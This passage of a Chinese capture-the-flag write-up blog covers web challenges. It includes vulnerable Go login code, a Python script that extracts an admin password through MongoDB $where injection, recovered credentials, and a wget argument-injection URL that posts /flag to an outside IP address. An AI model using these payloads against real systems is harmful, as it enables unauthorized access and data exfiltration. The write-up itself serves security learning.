+        c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">)</span>
+        c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"&lt;script>alert('The username or password is empty');window.location.href='/login'&lt;/script>"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+
+    conn<span class="token punctuation">,</span> err <span class="token operator">:=</span> mgo<span class="token punctuation">.</span><span class="token function">Dial</span><span class="token punctuation">(</span>MOGODB_URI<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">defer</span> conn<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span><span class="token function">SetMode</span><span class="token punctuation">(</span>mgo<span class="token punctuation">.</span>Monotonic<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
+
+    db_table <span class="token operator">:=</span> conn<span class="token punctuation">.</span><span class="token function">DB</span><span class="token punctuation">(</span><span class="token string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">"users"</span><span class="token punctuation">)</span>
+    result <span class="token operator">:=</span> User<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    err <span class="token operator">=</span> db_table<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span>bson<span class="token punctuation">.</span>M<span class="token punctuation">&#123;</span><span class="token string">"$where"</span><span class="token punctuation">:</span><span class="token string">"function() &#123;if(this.username == '"</span><span class="token operator">+</span>username<span class="token operator">+</span><span class="token string">"' &amp;&amp; this.password == '"</span><span class="token operator">+</span>password<span class="token operator">+</span><span class="token string">"') &#123;return true;&#125;&#125;"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">One</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>result<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> result<span class="token punctuation">.</span>Username <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
+        c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">)</span>
+        c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"&lt;script>alert('Login Failed!');window.location.href='/login'&lt;/script>"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> username <span class="token operator">==</span> result<span class="token punctuation">.</span>Username <span class="token operator">||</span> password <span class="token operator">==</span> result<span class="token punctuation">.</span>Password <span class="token punctuation">&#123;</span>
+        session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span>
+        session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span>
+        session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusFound<span class="token punctuation">,</span> <span class="token string">"/home"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">)</span>
+        c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"&lt;script>alert('Pretend you logged in successfully');window.location.href='/login'&lt;/script>"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>登陆处明显存在nosql注入，但不知到为啥俺试了好多次都没成功。。可能还是不太了解吧，然后突然发现，这个地方和东华杯2021的OldLibrary的核心代码一模一样吗？（得赶紧复现之前的比赛了），从username处测试一直失败，换成password就成功了，nosql注入也得好好测试总结下:)</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/Snipaste_2021-11-07_15-03-30.png" alt="Snipaste_2021-11-07_15-03-30"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://3b15b38a-cd63-4130-ac00-742a8d9124d6.node4.buuoj.cn:81/login"</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0"</span>
+<span class="token punctuation">&#125;</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"aaa"</span><span class="token punctuation">,</span>
+            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1'||this.password[&#123;&#125;]=='&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"Pretend you logged in successfully"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'over'</span><span class="token punctuation">)</span>
+<span class="token comment"># username admin</span>
+<span class="token comment"># password 54a83850073b0f4c6862d5a1d48ea84f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>登陆后剩下的两个路由看不懂怎么用，环境搭不好，然后就看了看其他方向被打穿的题目，emmm,还是继续看web吧，然后就结束了，</p>
+<p>剩下的就等着看师傅们的wp了。</p>
+<h2 id="赛后复现"><a href="#赛后复现" class="headerlink" title="赛后复现"></a>赛后复现</h2><p><strong>guoke师傅的wp，tql，菜鸡照着复现下  <a target="_blank" rel="noopener" href="https://guokeya.github.io/post/uTJmIcHXf/">https://guokeya.github.io/post/uTJmIcHXf/</a></strong></p>
+<h3 id="CheckIN-1"><a href="#CheckIN-1" class="headerlink" title="CheckIN"></a>CheckIN</h3><p>wget原来还能往外发数据，长知识了  <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/59bb131bc2ab">https://www.jianshu.com/p/59bb131bc2ab</a></p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211108124314151.png" alt="image-20211108124314151"></p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">getController</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"/bin/wget"</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span><span class="token function">QueryArray</span><span class="token punctuation">(</span><span class="token string">"argv"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span>
+    err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> <span class="token string">"Nothing"</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里是从数组中第二个元素开始取，所以先传个argv=111</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//b1d3bd4e-c41f-4b7b-a2ee-e61d86dc05a5.node4.buuoj.cn:81/wget?argv=111&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://39.96.12.202:22222</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211108125657634.png" alt="image-20211108125657634"></p>
+<h3 id="eaaasyphp补充"><a href="#eaaasyphp补充" class="headerlink" title="eaaasyphp补充"></a>eaaasyphp补充</h3><p>​        官方wp出了，看下，好像前两个多少都有点非预期:)，有一个点第一次遇到，学习了。</p>
+<p>Hint类可以绕过__wakeup()来获得phpinfo,</p>
+<p><strong>官方wp截图，给出的参考链接  <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81151">https://bugs.php.net/bug.php?id=81151</a></strong></p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114000200703.png" alt="image-20211114000200703"></p>
+<p>======================================================================================</p>
+<p>本地复现（php7.0）</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114000010609.png" alt="image-20211114000010609"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>1,<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/uTJmIcHXf/">https://guokeya.github.io/post/uTJmIcHXf/</a></p>
+<p>2,<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&amp;mid=2247494036&amp;idx=1&amp;sn=85a8e88fc2a4e984f2bdb7da35b4f0a2&amp;chksm=f9e3ff05ce947613aa6f143bd5fc834cbe850b2f4f625224aa92679d360debaa84fbdb3262b2&amp;mpshare=1&amp;scene=23&amp;srcid=11082kUHtj6JCEQ3XmynVsn0&amp;sharer_sharetime=1636340561350&amp;sharer_shareid=bacd65fea61d06307192a0a1b45e123a#rd">https://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&amp;mid=2247494036&amp;idx=1&amp;sn=85a8e88fc2a4e984f2bdb7da35b4f0a2&amp;chksm=f9e3ff05ce947613aa6f143bd5fc834cbe850b2f4f625224aa92679d360debaa84fbdb3262b2&amp;mpshare=1&amp;scene=23&amp;srcid=11082kUHtj6JCEQ3XmynVsn0&amp;sharer_sharetime=1636340561350&amp;sharer_shareid=bacd65fea61d06307192a0a1b45e123a#rd</a></p>
+<p>3,<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226750">https://www.anquanke.com/post/id/226750</a></p>
+<p>4,<a target="_blank" rel="noopener" href="http://www.hackdig.com/10/hack-522586.htm">http://www.hackdig.com/10/hack-522586.htm</a></p>
+<p>5,<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/59bb131bc2ab">https://www.jianshu.com/p/59bb131bc2ab</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># php反序列化</a>
+              <a href="/tags/php-fpm/" rel="tag"># php-fpm</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/07/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020%5DRoamphp2-Myblog/" rel="prev" title="[极客大挑战 2020]Roamphp2-Myblog">
+      <i class="fa fa-chevron-left"></i> [极客大挑战 2020]Roamphp2-Myblog
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/12/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8B%86%E7%94%B5%E8%84%91/" rel="next" title="第一次拆电脑">
+      第一次拆电脑 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%87%E5%8E%9F%E6%88%98%E7%96%ABweb%E9%83%A8%E5%88%86wp"><span class="nav-number">1.</span> <span class="nav-text">陇原战疫web部分wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B5%9B%E5%90%8E%E9%83%A8%E5%88%86wp"><span class="nav-number">1.2.</span> <span class="nav-text">赛后部分wp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eaaasyphp"><span class="nav-number">1.2.1.</span> <span class="nav-text">eaaasyphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CheckIN"><span class="nav-number">1.2.2.</span> <span class="nav-text">CheckIN</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.3.</span> <span class="nav-text">赛后复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CheckIN-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">CheckIN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#eaaasyphp%E8%A1%A5%E5%85%85"><span class="nav-number">1.3.2.</span> <span class="nav-text">eaaasyphp补充</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.4.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <!--<span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>-->
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+</body>
+</html>
